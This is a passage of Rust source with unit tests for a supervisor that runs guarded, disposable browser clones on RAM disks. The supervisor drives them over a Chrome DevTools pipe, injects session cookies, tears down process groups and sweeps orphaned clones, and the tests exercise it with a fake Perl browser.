    /// two Bridge instances sharing that directory never touch each other's
    /// clones.
    pub fn new(ledger_path: PathBuf) -> Arc<Self> {
        Self::with_parts(
            ledger_path,
            std::env::temp_dir().join(MOUNTS_DIR_NAME),
            Box::new(RamDisk),
            CloneConfig::from_env(),
        )
    }

    /// A supervisor whose clones are always guarded: launched behind the egress
    /// proxy with the request checker armed. This is what the orchestrator uses,
    /// because a clone that will hold a real session must never be unguarded.
    pub fn guarded(ledger_path: PathBuf) -> Arc<Self> {
        Self::with_parts(
            ledger_path,
            std::env::temp_dir().join(MOUNTS_DIR_NAME),
            Box::new(RamDisk),
            CloneConfig {
                guarded: true,
                ..CloneConfig::from_env()
            },
        )
    }

    /// A supervisor on a real RAM disk with an explicit mounts dir and config.
    /// For the orchestrator's live end-to-end test, which needs a guarded,
    /// headless clone under a temp mounts dir it can assert on.
    #[doc(hidden)]
    pub fn with_ram_disk(
        ledger_path: PathBuf,
        mounts_dir: PathBuf,
        config: CloneConfig,
    ) -> Arc<Self> {
        Self::with_parts(ledger_path, mounts_dir, Box::new(RamDisk), config)
    }

    fn with_parts(
        ledger_path: PathBuf,
        mounts_dir: PathBuf,
        backend: Box<dyn VolumeBackend>,
        config: CloneConfig,
    ) -> Arc<Self> {
        Arc::new(Self {
            ledger: Ledger::new(ledger_path),
            mounts_dir,
            backend,
            config,
            clones: Mutex::new(HashMap::new()),
        })
    }

    /// Start a clone: mount a RAM disk, launch the browser on a profile inside
    /// it, and wait until it answers over the pipe.
    ///
    /// Returns a ready clone or a typed error within roughly
    /// `ready_timeout` plus teardown. On any error nothing is left behind: no
    /// process, no mount, no ledger record.
    pub fn spawn_clone(&self) -> Result<CloneInfo, CloneError> {
        let binary = self.resolve_browser()?;
        let mut id = Uuid::new_v4().simple().to_string();
        id.truncate(12);
        let mount = self.mounts_dir.join(&id);

        create_private_dir(&self.mounts_dir)?;
        // Recorded before the volume exists: a crash between the two is then a
        // volume-only record the next boot sweeps, not a leaked RAM disk.
        self.ledger.upsert(LedgerRecord {
            pid: None,
            mount: mount.clone(),
        })?;
        if let Err(error) = self.backend.create(&mount, self.config.ram_disk_mib) {
            self.discard(&mount);
            return Err(error);
        }

        // A guarded clone gets its own shared state and an egress proxy it is
        // launched behind. The state starts empty, so it can reach nothing until
        // a caller allows a host on it.
        let (guard, proxy) = if self.config.guarded {
            let state = Arc::new(Mutex::new(GuardState::new()));
            match EgressProxy::start(Arc::clone(&state)) {
                Ok(proxy) => (Some(state), Some(proxy)),
                Err(error) => {
                    self.discard(&mount);
                    return Err(CloneError::Launch(format!("egress proxy: {error}")));
                }
            }
        } else {
            (None, None)
        };

        let profile = mount.join(PROFILE_DIR_NAME);
        let mut args = launch_args(&profile, self.config.headless);
        if let Some(proxy) = &proxy {
            args.extend(proxy.launch_args());
        }
        let launched = fs::create_dir(&profile)
            .map_err(|error| CloneError::Launch(format!("profile dir: {error}")))
            .and_then(|()| launch(&binary, &args));
        let (child, pipe) = match launched {
            Ok(launched) => launched,
            Err(error) => {
                self.discard(&mount);
                return Err(error);
            }
        };

        let pid = child.id();
        let live = LiveClone {
            child,
            pipe: Arc::clone(&pipe),
            mount: mount.clone(),
            guard: guard.clone(),
            _proxy: proxy,
            page_session: Mutex::new(None),
        };
        if let Err(error) = self.ledger.upsert(LedgerRecord {
            pid: Some(pid),
            mount: mount.clone(),
        }) {
            let _ = self.teardown(live);
            return Err(error);
        }
        match self.await_ready(&pipe) {
            Ok(product) => {
                // Arm layer 1: intercept every request at the browser level and
                // adjudicate it against the shared guard state. The handler runs
                // on the pipe's reader thread and only writes its verdict, so it
                // cannot deadlock; it holds a Weak so it never keeps the pipe
                // (and thus the clone) alive.
                if let Some(state) = &guard {
                    let weak = Arc::downgrade(&pipe);
                    let state = Arc::clone(state);
                    pipe.set_event_handler(Arc::new(move |event| {
                        if event.get("method").and_then(Value::as_str)
                            != Some("Fetch.requestPaused")
                        {
                            return;
                        }
                        let Some(pipe) = weak.upgrade() else { return };
                        let params = event.get("params").cloned().unwrap_or(Value::Null);
                        let (command, command_params, _record) =
                            browser_clone_guard::fetch_verdict(&state, &params);
                        pipe.send_no_wait(None, command, command_params);
                    }));
                    let (method, params) = browser_clone_guard::fetch_enable_command();
                    if let Err(error) = pipe.call(method, params, self.config.call_timeout) {
                        let _ = self.teardown(live);
                        return Err(error);
                    }
                }
                lock(&self.clones).insert(id.clone(), live);
                Ok(CloneInfo {
                    id,
                    pid,
                    mount,
                    product,
                })
            }
            Err(error) => {
                let _ = self.teardown(live);
                Err(error)
            }
        }
    }

    /// The leak guard's shared state for a guarded clone: allow hosts on it and
    /// register the session secrets that must not leave to other hosts. `None`
    /// for an unguarded clone or an unknown id.
    pub fn clone_guard(&self, clone_id: &str) -> Option<Arc<Mutex<GuardState>>> {
        lock(&self.clones).get(clone_id).and_then(|clone| clone.guard.clone())
    }

    /// Run one CDP command against a clone on behalf of the agent tool. The tool
    /// (`clone_browser_tool`) is the only caller; it restricts the method set
    /// and scrubs the result, so this stays crate-internal.
    pub(crate) fn tool_call(
        &self,
        clone_id: &str,
        method: &str,
        params: Value,
    ) -> Result<Value, CloneError> {
        self.pipe(clone_id)?.call(method, params, self.config.call_timeout)
    }

    /// Run a page-scoped CDP command against the clone's primary page target.
    /// Attaches to a page target on first use (screenshot, input, accessibility,
    /// navigate all need a page session; the browser endpoint cannot serve
    /// them). The agent tool and the live frame go through here.
    pub(crate) fn page_call(
        &self,
        clone_id: &str,
        method: &str,
        params: Value,
    ) -> Result<Value, CloneError> {
        let session = self.ensure_page_session(clone_id)?;
        self.pipe(clone_id)?
            .request(Some(&session), method, params, self.config.call_timeout)
    }

    /// The clone's primary page-target session, created and attached the first
    /// time it is needed.
    fn ensure_page_session(&self, clone_id: &str) -> Result<String, CloneError> {
        if let Some(existing) = self
            .clones
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .get(clone_id)
            .and_then(|clone| clone.page_session.lock().unwrap_or_else(|p| p.into_inner()).clone())
        {
            return Ok(existing);
        }
        let pipe = self.pipe(clone_id)?;
        let target = pipe.call(
            "Target.createTarget",
            json!({ "url": "about:blank" }),
            self.config.call_timeout,
        )?;
        let target_id = target
            .get("targetId")
            .and_then(Value::as_str)
            .ok_or_else(|| CloneError::Cdp {
                method: "Target.createTarget".into(),
                message: "no targetId".into(),
            })?;
        let attached = pipe.call(
            "Target.attachToTarget",
            json!({ "targetId": target_id, "flatten": true }),
            self.config.call_timeout,
        )?;
        let session = attached
            .get("sessionId")
            .and_then(Value::as_str)
            .ok_or_else(|| CloneError::Cdp {
                method: "Target.attachToTarget".into(),
                message: "no sessionId".into(),
            })?
            .to_owned();
        let _ = pipe.request(Some(&session), "Page.enable", json!({}), self.config.call_timeout);
        if let Some(clone) = self
            .clones
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .get(clone_id)
        {
            *clone.page_session.lock().unwrap_or_else(|p| p.into_inner()) = Some(session.clone());
        }
        Ok(session)
    }

    /// Inject `cookies` into the clone as session cookies. They are readable
    /// in-page and stay out of the profile's `Cookies` file while the clone
    /// runs; [`Self::destroy`] kills the browser without a graceful flush and
    /// ejects the volume, so they never outlive it. Fails if any cookie is
    /// invalid, dropped by the browser, or stored as persistent. Cookie values
    /// never appear in an error.
    pub fn load_session(&self, clone_id: &str, cookies: Vec<CookieSpec>) -> Result<(), CloneError> {
        let pipe = self.pipe(clone_id)?;
        load_session_over(&pipe, &cookies, self.config.call_timeout)
    }

    /// Kill the clone's whole process group, eject its RAM disk, and forget it.
    /// When this returns `Ok`, the mount path no longer exists.
    pub fn destroy(&self, clone_id: &str) -> Result<(), CloneError> {
        let clone = lock(&self.clones)
            .remove(clone_id)
            .ok_or_else(|| CloneError::UnknownClone(clone_id.to_owned()))?;
        self.teardown(clone)
    }

    /// Reap clones a previous core left behind: kill the process group of every
    /// recorded clone that is still running, and eject its volume. Run at core
    /// boot, before the core serves. Fails soft: a record that cannot be
    /// resolved stays in the ledger for the next boot and is reported.
    ///
    /// Only the ledger's pid and mount path are trusted, and neither blindly:
    /// a mount outside the clone mounts dir is refused, and a pid is only
    /// killed while a process in that group still carries the mount path in its
    /// command line, so a recycled pid is never signalled.
    pub fn sweep_orphans(&self) -> SweepReport {
        let mut report = SweepReport::default();
        let records = self.ledger.load();
        if records.is_empty() {
            return report;
        }
        let ours: HashSet<PathBuf> = lock(&self.clones)
            .values()
            .map(|clone| clone.mount.clone())
            .collect();
        for record in records {
            if ours.contains(&record.mount) {
                continue;
            }
            if !self.owns_mount(&record.mount) {
                let _ = self.ledger.remove(&record.mount);
                report.rejected.push(record.mount);
                continue;
            }
            if let Some(pid) = record.pid {
                if process_group_mentions(pid, &record.mount.to_string_lossy()) {
                    if kill_group_now(pid) {
                        report.killed.push(pid);
                    } else {
                        report
                            .failed
                            .push((record.mount, format!("could not stop process group {pid}")));
                        continue;
                    }
                }
            }
            match self.backend.eject(&record.mount) {
                Ok(()) => {
                    let _ = self.ledger.remove(&record.mount);
                    report.ejected.push(record.mount);
                }
                Err(error) => report.failed.push((record.mount, error.to_string())),
            }
        }
        if !report.is_empty() {
            diagnostics::record(&format!(
                "bridge: browser clone sweep killed={} ejected={} rejected={} failed={}",
                report.killed.len(),
                report.ejected.len(),
                report.rejected.len(),
                report.failed.len()
            ));
        }
        report
    }

    fn resolve_browser(&self) -> Result<PathBuf, CloneError> {
        if let Some(explicit) = &self.config.browser {
            return if explicit.is_file() {
                Ok(explicit.clone())
            } else {
                Err(CloneError::NoBrowser)
            };
        }
        self.config
            .search_paths
            .clone()
            .unwrap_or_else(default_browser_candidates)
            .into_iter()
            .find(|candidate| candidate.is_file())
            .ok_or(CloneError::NoBrowser)
    }

    fn await_ready(&self, pipe: &CdpPipe) -> Result<String, CloneError> {
        let started = Instant::now();
        match pipe.call("Browser.getVersion", json!({}), self.config.ready_timeout) {
            Ok(version) => Ok(version
                .get("product")
                .and_then(Value::as_str)
                .unwrap_or("unknown")
                .to_owned()),
            Err(CloneError::Timeout { .. }) => Err(CloneError::NotReady {
                waited_ms: started.elapsed().as_millis() as u64,
            }),
            Err(other) => Err(other),
        }
    }

    fn pipe(&self, clone_id: &str) -> Result<Arc<CdpPipe>, CloneError> {
        lock(&self.clones)
            .get(clone_id)
            .map(|clone| Arc::clone(&clone.pipe))
            .ok_or_else(|| CloneError::UnknownClone(clone_id.to_owned()))
    }

    /// A mount is ours only if it is a single alphanumeric component directly
    /// under the mounts dir. The ledger is a file on disk; a damaged or edited
    /// one must not be able to point `hdiutil detach -force` elsewhere.
    fn owns_mount(&self, mount: &Path) -> bool {
        mount.parent() == Some(self.mounts_dir.as_path())
            && mount
                .file_name()
                .and_then(|name| name.to_str())
                .is_some_and(|name| {
                    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric())
                })
    }

    /// Undo a volume that never got a browser.
    fn discard(&self, mount: &Path) {
        if self.backend.eject(mount).is_ok() {
            let _ = self.ledger.remove(mount);
        }
    }

    /// Stop the browser, reap it, eject the volume, and drop the record. The
    /// record is kept when the process or the volume could not be dealt with,
    /// so the next boot's sweep retries.
    fn teardown(&self, mut clone: LiveClone) -> Result<(), CloneError> {
        let pid = clone.child.id();
        let stopped = kill_group_now(pid);
        if stopped {
            let _ = clone.child.wait();
        } else {
            let _ = clone.child.try_wait();
        }
        // Closing our end of the pipe also tells a survivor to exit.
        drop(clone.pipe);
        let ejected = self.backend.eject(&clone.mount);
        if ejected.is_ok() && stopped {
            self.ledger.remove(&clone.mount)?;
        }
        ejected?;
        if stopped {
            Ok(())
        } else {
            Err(CloneError::KillFailed { pid })
        }
    }
}

impl Drop for CloneSupervisor {
    fn drop(&mut self) {
        let clones: Vec<LiveClone> = lock(&self.clones).drain().map(|(_, clone)| clone).collect();
        for clone in clones {
            let _ = self.teardown(clone);
        }
    }
}

/// SIGKILL a clone's whole process group at once, then wait for every live
/// member to be gone. There is deliberately no SIGTERM first: a clone holds
/// nothing worth a graceful shutdown, and a graceful shutdown is exactly when
/// Chromium flushes session cookies into the profile's `Cookies` database.
fn kill_group_now(pgid: u32) -> bool {
    // SAFETY: killpg only delivers a signal. Callers pass a pgid that is either
    // their own unreaped child (so it cannot have been recycled) or one the
    // sweep has just matched against the clone's mount path.
    unsafe { libc::killpg(pgid as libc::pid_t, libc::SIGKILL) };
    let deadline = Instant::now() + KILL_WAIT;
    while group_has_live_members(pgid) {
        if Instant::now() >= deadline {
            return false;
        }
        thread::sleep(Duration::from_millis(20));
    }
    true
}

/// True while group `pgid` has a member that is not a zombie. A SIGKILLed
/// child stays a zombie until its parent reaps it, and that is not a process
/// that can touch the volume. Fails closed: if `ps` cannot be run, the group is
/// treated as alive, so the ledger record survives for the next sweep.
fn group_has_live_members(pgid: u32) -> bool {
    let Ok(output) = Command::new(PS)
        .args(["-ax", "-o", "pgid=", "-o", "stat="])
        .stderr(Stdio::null())
        .output()
    else {
        return true;
    };
    if !output.status.success() {
        return true;
    }
    String::from_utf8_lossy(&output.stdout).lines().any(|line| {
        let mut fields = line.split_whitespace();
        fields.next().and_then(|value| value.parse::<u32>().ok()) == Some(pgid)
            && fields.next().is_some_and(|state| !state.starts_with('Z'))
    })
}

/// True while a process in group `pgid` has `needle` in its command line.
fn process_group_mentions(pgid: u32, needle: &str) -> bool {
    let Ok(output) = Command::new(PS)
        .args(["-ax", "-ww", "-o", "pgid=", "-o", "command="])
        .stderr(Stdio::null())
        .output()
    else {
        return false;
    };
    output.status.success()
        && String::from_utf8_lossy(&output.stdout).lines().any(|line| {
            let mut fields = line.trim_start().splitn(2, char::is_whitespace);
            fields.next().and_then(|value| value.parse::<u32>().ok()) == Some(pgid)
                && fields.next().is_some_and(|command| command.contains(needle))
        })
}

#[cfg(test)]
impl CloneSupervisor {
    fn profile_dir(&self, clone_id: &str) -> Option<PathBuf> {
        lock(&self.clones)
            .get(clone_id)
            .map(|clone| clone.mount.join(PROFILE_DIR_NAME))
    }

    /// A raw CDP call, for tests that need to see the browser itself.
    fn cdp(
        &self,
        clone_id: &str,
        session_id: Option<&str>,
        method: &str,
        params: Value,
    ) -> Result<Value, CloneError> {
        self.pipe(clone_id)?
            .request(session_id, method, params, self.config.call_timeout)
    }

}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::io::Cursor;

    // ------------------------------------------------------------ test doubles

    struct DirBackend;

    impl VolumeBackend for DirBackend {
        fn create(&self, mount: &Path, _size_mib: u64) -> Result<(), CloneError> {
            create_private_dir(mount)
        }
        fn eject(&self, mount: &Path) -> Result<(), CloneError> {
            remove_leftover(mount)
        }
    }

    struct FailingCreate;

    impl VolumeBackend for FailingCreate {
        fn create(&self, _mount: &Path, _size_mib: u64) -> Result<(), CloneError> {
            Err(CloneError::Volume("no memory for a RAM disk".into()))
        }
        fn eject(&self, mount: &Path) -> Result<(), CloneError> {
            remove_leftover(mount)
        }
    }

    struct FailingEject;

    impl VolumeBackend for FailingEject {
        fn create(&self, mount: &Path, _size_mib: u64) -> Result<(), CloneError> {
            create_private_dir(mount)
        }
        fn eject(&self, _mount: &Path) -> Result<(), CloneError> {
            Err(CloneError::Volume("resource busy".into()))
        }
    }

    /// A stand-in browser: speaks the pipe protocol on fd 3/4 and records what
    /// it was launched with and its pid, so tests can assert on the real child.
    const FAKE_BROWSER: &str = r##"#!/usr/bin/perl
use strict;
use warnings;
use JSON::PP;
use File::Basename qw(dirname);

my $mode = '__MODE__';
my $here = dirname($0);
# Probed before this script opens anything of its own, so a freed number
# cannot be reused and misread as inherited.
my $inherited;
if ($mode =~ /^fdcheck:(\d+)$/) {
    $inherited = (-e "/dev/fd/$1") ? 'open' : 'closed';
}
open(my $pidfile, '>', "$here/browser.pid") or exit 2;
print $pidfile $$;
close $pidfile;
if (defined $inherited) {
    open(my $report, '>', "$here/fd.txt") or exit 9;
    print $report $inherited;
    close $report;
}

open(my $in, '<&=', 3) or exit 3;
open(my $out, '>&=', 4) or exit 4;
select((select($out), $| = 1)[0]);

my $profile;
for my $arg (@ARGV) {
    $profile = $1 if $arg =~ /^--user-data-dir=(.*)$/s;
}
if (defined $profile) {
    open(my $log, '>', "$profile/argv.txt") or exit 5;
    print $log "$_\n" for @ARGV;
    close $log;
}
exit 0 if $mode eq 'exit';
if ($mode eq 'helper') {
    my $child = fork();
    exit 6 unless defined $child;
    if ($child == 0) {
        exec('sleep', '300');
        exit 7;
    }
    open(my $helper, '>', "$here/helper.pid") or exit 8;
    print $helper $child;
    close $helper;
}

my $json = JSON::PP->new->canonical;
my @cookies;
my $typed = "";
$/ = "\0";
while (defined(my $raw = <$in>)) {
    chomp $raw;
    next if $mode eq 'silent';
    my $message = $json->decode($raw);
    my $method = $message->{method} // '';
    open(my $calls, '>>', "$here/commands.jsonl") or exit 10;
    print $calls $json->encode($message), "\n";
    close $calls;
    my $result = {};
    if ($method eq 'Browser.getVersion') {
        $result = { product => 'FakeChrome/1.0' };
    } elsif ($method eq 'Target.getTargets') {
        $result = { targetInfos => [{ targetId => 'fixture-page', type => 'page', url => 'about:blank' }] };
    } elsif ($method eq 'Target.createTarget') {
        $result = { targetId => 'fixture-page' };
    } elsif ($method eq 'Target.attachToTarget') {
        $result = { sessionId => 'fixture-session' };
    } elsif ($method eq 'Extensions.loadUnpacked') {
        $result = { id => 'fixture-extension' };
    } elsif ($method eq 'Page.captureScreenshot') {
        $result = { data => 'fixture-person-only-image' };
    } elsif ($method eq 'Accessibility.getFullAXTree') {
        $result = { nodes => [{ nodeId => '1', role => { value => 'textField' }, value => { value => $typed } }, { nodeId => '2', role => { value => 'StaticText' }, name => { value => "echo:$typed" } }] };
    } elsif ($method eq 'Input.insertText') {
        $typed = $message->{params}{text};
    } elsif ($method eq 'Storage.setCookies') {
        push @cookies, @{ $message->{params}{cookies} // [] };
    } elsif ($method eq 'Storage.getCookies') {
        $result = { cookies => [ map { +{ %$_, session => (exists $_->{expires} ? JSON::PP::false() : JSON::PP::true()) } } @cookies ] };
    }
    print $out $json->encode({ id => $message->{id}, result => $result }), "\0";
}
"##;

    fn fake_browser(dir: &Path, mode: &str) -> PathBuf {
        let path = dir.join("fake-browser");
        fs::write(&path, FAKE_BROWSER.replace("__MODE__", mode)).unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
        path
    }

    /// Synthetic child and ordinary temporary directory; never a real browser,
    /// RAM disk, Keychain item or user profile.
    pub(crate) fn synthetic_supervisor(dir: &Path, guarded: bool) -> Arc<CloneSupervisor> {
        CloneSupervisor::with_parts(
            dir.join("ledger.json"), dir.join("mounts"), Box::new(DirBackend),
            CloneConfig { browser: Some(fake_browser(dir, "normal")), guarded, ..CloneConfig::default() },
        )
    }

    /// A supervisor over the fake browser and a directory-backed volume. The
    /// supervisor is declared first so it drops (and cleans up) before the
    /// temp dir it lives in.
    struct Harness {
        supervisor: Arc<CloneSupervisor>,
        dir: tempfile::TempDir,
    }

    impl Harness {
        fn new(mode: &str) -> Self {
            Self::with(mode, Box::new(DirBackend), |_| {})
        }

        fn with(
            mode: &str,
            backend: Box<dyn VolumeBackend>,
            tweak: impl FnOnce(&mut CloneConfig),
        ) -> Self {
            let dir = tempfile::tempdir().unwrap();
            let mut config = CloneConfig {
                browser: Some(fake_browser(dir.path(), mode)),
                ready_timeout: Duration::from_secs(10),
                call_timeout: Duration::from_secs(5),
                ..CloneConfig::default()
            };
            tweak(&mut config);
            let supervisor = CloneSupervisor::with_parts(
                dir.path().join("browser-clones.json"),
                dir.path().join("mounts"),
                backend,
                config,
            );
            Self { supervisor, dir }
        }

        fn ledger_path(&self) -> PathBuf {
            self.dir.path().join("browser-clones.json")
        }

        fn mounts(&self) -> PathBuf {
            self.dir.path().join("mounts")
        }

        fn recorded_pid(&self, file: &str) -> u32 {
            let path = self.dir.path().join(file);
            assert!(
                wait_until(3000, || path.exists()),
                "{file} was never written"
            );
            fs::read_to_string(path).unwrap().trim().parse().unwrap()
        }
    }

    fn pid_alive(pid: u32) -> bool {
        // SAFETY: signal 0 only probes for existence.
        unsafe { libc::kill(pid as libc::pid_t, 0) == 0 }
    }

    fn wait_until(limit_ms: u64, mut check: impl FnMut() -> bool) -> bool {
        let started = Instant::now();
        while started.elapsed() < Duration::from_millis(limit_ms) {
            if check() {
                return true;
            }
            thread::sleep(Duration::from_millis(20));
        }
        check()
    }

    /// A long-lived process in its own group. With `mount`, its command line
    /// carries `--user-data-dir=<mount>` the way a real clone's does.
    fn spawn_sleeper(mount: Option<&Path>) -> Child {
        let mut command = Command::new("perl");
        command.args(["-e", "sleep 300"]);
        if let Some(mount) = mount {
            command
                .arg("--")
                .arg(format!("--user-data-dir={}", mount.display()));
        }
        adapters::configure_process_group(&mut command);
        command
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap()
    }

    /// The far end of a CDP pipe, run by a thread the test controls.
    struct FakePipe {
        pipe: Arc<CdpPipe>,
        requests: Arc<Mutex<Vec<Value>>>,
        raw: Arc<Mutex<Vec<Vec<u8>>>>,
    }

    fn fake_pipe(mut answer: impl FnMut(&Value) -> Option<Value> + Send + 'static) -> FakePipe {
        let (browser_reads, we_write) = os_pipe().unwrap();
        let (we_read, browser_writes) = os_pipe().unwrap();
        let requests = Arc::new(Mutex::new(Vec::new()));
        let raw = Arc::new(Mutex::new(Vec::new()));
        let (seen, seen_raw) = (Arc::clone(&requests), Arc::clone(&raw));
        thread::spawn(move || {
            let mut reader = BufReader::new(browser_reads);
            let mut writer = browser_writes;
            loop {
                let mut bytes = Vec::new();
                if reader.read_until(0, &mut bytes).unwrap_or(0) == 0 {
                    break;
                }
                lock(&seen_raw).push(bytes.clone());
                bytes.pop();
                let request: Value = serde_json::from_slice(&bytes).unwrap();
                lock(&seen).push(request.clone());
                if let Some(mut reply) = answer(&request) {
                    reply["id"] = request["id"].clone();
                    let mut frame = serde_json::to_vec(&reply).unwrap();
                    frame.push(0);
                    if writer.write_all(&frame).is_err() {
                        break;
                    }
                }
            }
        });
        FakePipe {
            pipe: CdpPipe::start(we_read, we_write),
            requests,
            raw,
        }
    }

    /// Answers like a browser that stores what it is given. `session` is what
    /// it reports back for every cookie; `forget` makes it drop them all.
    fn cookie_store(session: bool, forget: bool) -> impl FnMut(&Value) -> Option<Value> {
        let mut stored: Vec<Value> = Vec::new();
        move |request| {
            Some(match request["method"].as_str().unwrap_or("") {
                "Storage.setCookies" => {
                    stored.extend(
                        request["params"]["cookies"]
                            .as_array()
                            .cloned()
                            .unwrap_or_default(),
                    );
                    json!({ "result": {} })
                }
                "Storage.getCookies" => {
                    let cookies: Vec<Value> = if forget {
                        Vec::new()
                    } else {
                        stored
                            .iter()
                            .map(|cookie| {
                                let mut cookie = cookie.clone();
                                cookie["session"] = json!(session);
                                cookie
                            })
                            .collect()
                    };
                    json!({ "result": { "cookies": cookies } })
                }
                _ => json!({ "result": {} }),
            })
        }
    }

    fn cookie(name: &str) -> CookieSpec {
        CookieSpec {
            name: name.into(),
            value: "value-1".into(),
            domain: ".example.com".into(),
            path: "/".into(),
            secure: true,
            http_only: true,
            same_site: Some(SameSite::Lax),
        }
    }

    // ------------------------------------------------------ 1. launch arguments

    #[test]
    fn launch_args_use_the_pipe_and_the_temp_profile() {
        let args = launch_args(Path::new("/tmp/x/profile"), false);
        assert!(args.contains(&"--remote-debugging-pipe".to_owned()));
        assert!(args.contains(&"--user-data-dir=/tmp/x/profile".to_owned()));
        assert!(validate_launch_args(&args).is_ok());
    }

    #[test]
    fn launch_args_never_ask_for_a_tcp_debugging_port() {
        for headless in [false, true] {
            let args = launch_args(Path::new("/tmp/x/profile"), headless);
            assert!(
                !args
                    .iter()
                    .any(|arg| arg.starts_with("--remote-debugging-port")),
                "{args:?}"
            );
            assert!(
                !args
                    .iter()
                    .any(|arg| arg.starts_with("--remote-debugging-address")),
                "{args:?}"
            );
        }
    }

    #[test]
    fn the_guard_refuses_a_port_flag_before_any_launch() {
        for flag in ["--remote-debugging-port=9222", "--remote-debugging-port"] {
            let mut args = launch_args(Path::new("/tmp/x/profile"), false);
            args.push(flag.to_owned());
            assert!(
                matches!(validate_launch_args(&args), Err(CloneError::Launch(_))),
                "{flag}"
            );
        }
        let mut no_pipe = launch_args(Path::new("/tmp/x/profile"), false);
        no_pipe.retain(|arg| arg != PIPE_FLAG);
        assert!(validate_launch_args(&no_pipe).is_err());
    }

    #[test]
    fn headless_is_opt_in() {
        let headed = launch_args(Path::new("/tmp/p"), false);
        let headless = launch_args(Path::new("/tmp/p"), true);
        assert!(!headed.iter().any(|arg| arg.starts_with("--headless")));
        assert!(headless.contains(&"--headless=new".to_owned()));
    }

    #[test]
    fn launch_args_avoid_the_keychain_and_first_run_ui() {
        let args = launch_args(Path::new("/tmp/p"), false);
        assert!(args.contains(&"--use-mock-keychain".to_owned()));
        assert!(args.contains(&"--no-first-run".to_owned()));
    }

    #[test]
    fn launch_args_cap_the_disk_cache_below_the_ram_disk() {
        let args = launch_args(Path::new("/tmp/p"), false);
        let cap = args
            .iter()
            .find_map(|arg| arg.strip_prefix("--disk-cache-size="))
            .and_then(|value| value.parse::<u64>().ok())
            .expect("a disk cache cap is passed");
        assert!(cap < DEFAULT_RAM_DISK_MIB * 1024 * 1024 / 2, "cap {cap} leaves no room");
    }

    // ------------------------------------------------------ 2. CDP over a pipe

    #[test]
    fn requests_are_nul_terminated_json_and_replies_are_returned() {
        let fake = fake_pipe(|_| Some(json!({ "result": { "ok": true } })));
        let result = fake
            .pipe
            .call("Page.enable", json!({ "a": 1 }), Duration::from_secs(2))
            .unwrap();
        assert_eq!(result, json!({ "ok": true }));
        let raw = lock(&fake.raw);
        assert_eq!(raw[0].last(), Some(&0));
        let requests = lock(&fake.requests);
        assert_eq!(requests[0]["method"], "Page.enable");
        assert_eq!(requests[0]["params"], json!({ "a": 1 }));
        assert!(requests[0]["id"].is_u64());
    }

    #[test]
    fn a_cdp_error_becomes_a_typed_error() {
        let fake = fake_pipe(|_| {
            Some(json!({ "error": { "code": -32000, "message": "nope" } }))
        });
        let error = fake
            .pipe
            .call("Page.enable", json!({}), Duration::from_secs(2))
            .unwrap_err();
        match error {
            CloneError::Cdp { method, message } => {
                assert_eq!(method, "Page.enable");
                assert_eq!(message, "nope");
            }
            other => panic!("expected a CDP error, got {other:?}"),
        }
    }

    #[test]
    fn a_silent_browser_times_out_and_frees_the_slot() {
        let fake = fake_pipe(|_| None);
        let started = Instant::now();
        let error = fake
            .pipe
            .call("Page.enable", json!({}), Duration::from_millis(150))
            .unwrap_err();
        assert!(matches!(error, CloneError::Timeout { .. }), "{error:?}");
        assert!(started.elapsed() < Duration::from_secs(3));
        assert!(lock(&fake.pipe.pending).is_empty());
    }

    #[test]
    fn a_dead_browser_fails_in_flight_and_later_calls() {
        let (browser_reads, we_write) = os_pipe().unwrap();
        let (we_read, browser_writes) = os_pipe().unwrap();
        let pipe = CdpPipe::start(we_read, we_write);
        let inflight = {
            let pipe = Arc::clone(&pipe);
            thread::spawn(move || pipe.call("Page.enable", json!({}), Duration::from_secs(10)))
        };
        thread::sleep(Duration::from_millis(100));
        drop(browser_writes);
        drop(browser_reads);
        assert!(matches!(
            inflight.join().unwrap(),
            Err(CloneError::BrowserExited)
        ));
        assert!(wait_until(2000, || pipe.is_closed()));
        assert!(matches!(
            pipe.call("Page.enable", json!({}), Duration::from_secs(1)),
            Err(CloneError::BrowserExited)
        ));
    }

    #[test]
    fn frames_are_bounded_and_split_on_nul() {
        let mut two = Cursor::new(b"one\0two\0".to_vec());
        assert_eq!(read_frame(&mut two, 16).unwrap(), Some(b"one".to_vec()));
        assert_eq!(read_frame(&mut two, 16).unwrap(), Some(b"two".to_vec()));
        assert_eq!(read_frame(&mut two, 16).unwrap(), None);

        let mut oversized = Cursor::new(vec![b'x'; 64]);
        assert_eq!(
            read_frame(&mut oversized, 16).unwrap_err().kind(),
            io::ErrorKind::InvalidData
        );
        let mut torn = Cursor::new(b"half".to_vec());
        assert_eq!(read_frame(&mut torn, 16).unwrap(), None);
    }

    // -------------------------------------------------------- 3. session cookies

    #[test]
    fn cookies_are_sent_without_an_expiry() {
        let fake = fake_pipe(cookie_store(true, false));
        load_session_over(&fake.pipe, &[cookie("sid")], Duration::from_secs(2)).unwrap();
        let requests = lock(&fake.requests);
        assert_eq!(requests[0]["method"], "Storage.setCookies");
        assert_eq!(requests[1]["method"], "Storage.getCookies");
        let sent = requests[0]["params"]["cookies"][0].as_object().unwrap();
        let mut keys: Vec<&str> = sent.keys().map(String::as_str).collect();
        keys.sort_unstable();
        assert_eq!(
            keys,
            ["domain", "httpOnly", "name", "path", "sameSite", "secure", "value"]
        );
        assert_eq!(sent["httpOnly"], true);
        assert_eq!(sent["sameSite"], "Lax");
    }

    #[test]
    fn an_empty_path_defaults_to_root() {
        let mut spec = cookie("sid");
        spec.path = String::new();
        assert_eq!(spec.to_cdp()["path"], "/");
        assert!(spec.validate().is_ok());
    }

    #[test]
    fn cookie_debug_output_hides_the_value() {
        let mut spec = cookie("sid");
        spec.value = "hunter2-do-not-log".into();
        let rendered = format!("{spec:?} {:?}", vec![spec.clone()]);
        assert!(!rendered.contains("hunter2-do-not-log"), "{rendered}");
        assert!(rendered.contains("sid"));
    }

    #[test]
    fn invalid_cookies_fail_before_anything_is_sent() {
        let fake = fake_pipe(cookie_store(true, false));
        let mut cases = Vec::new();
        let mut empty_name = cookie("sid");
        empty_name.name = String::new();
        cases.push(empty_name);
        let mut empty_domain = cookie("sid");
        empty_domain.domain = String::new();
        cases.push(empty_domain);
        let mut relative_path = cookie("sid");
        relative_path.path = "app".into();
        cases.push(relative_path);
        let mut none_insecure = cookie("sid");
